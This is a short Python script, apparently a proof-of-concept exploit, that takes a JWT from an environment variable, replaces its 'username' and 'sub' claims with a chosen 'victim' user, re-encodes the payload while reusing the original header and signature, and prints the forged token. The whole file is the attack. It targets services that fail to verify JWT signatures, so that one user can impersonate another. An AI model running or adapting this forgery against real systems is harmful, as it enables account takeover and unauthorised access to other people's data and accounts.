#!/usr/bin/env python3

import os
import json
import base64
import sys


def b64url_decode(data: str) -> bytes:
    data += "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data.encode())


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def main() -> int:
    token = os.environ.get("TOKEN_B")
    victim = os.environ.get("VICTIM_USER")

    if not token or not victim:
        print("Error: TOKEN_B and VICTIM_USER must be set in env.", file=sys.stderr)
        print("  export TOKEN_B='<full jwt>'", file=sys.stderr)
        print("  export VICTIM_USER='<victim username>'", file=sys.stderr)
        return 1

    parts = token.split(".")
    if len(parts) != 3:
        print(f"Error: token does not have 3 parts (got {len(parts)}).", file=sys.stderr)
        return 1

    header_b64, payload_b64, signature_b64 = parts

    payload = json.loads(b64url_decode(payload_b64))
    print(f"Original username: {payload.get('username')}", file=sys.stderr)
    print(f"Original sub     : {payload.get('sub')}", file=sys.stderr)

    payload["username"] = victim
    payload["sub"] = victim

    print(f"Forged username  : {victim}", file=sys.stderr)

    new_payload_b64 = b64url_encode(
        json.dumps(payload, separators=(",", ":")).encode()
    )

    forged = f"{header_b64}.{new_payload_b64}.{signature_b64}"
    print(forged)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
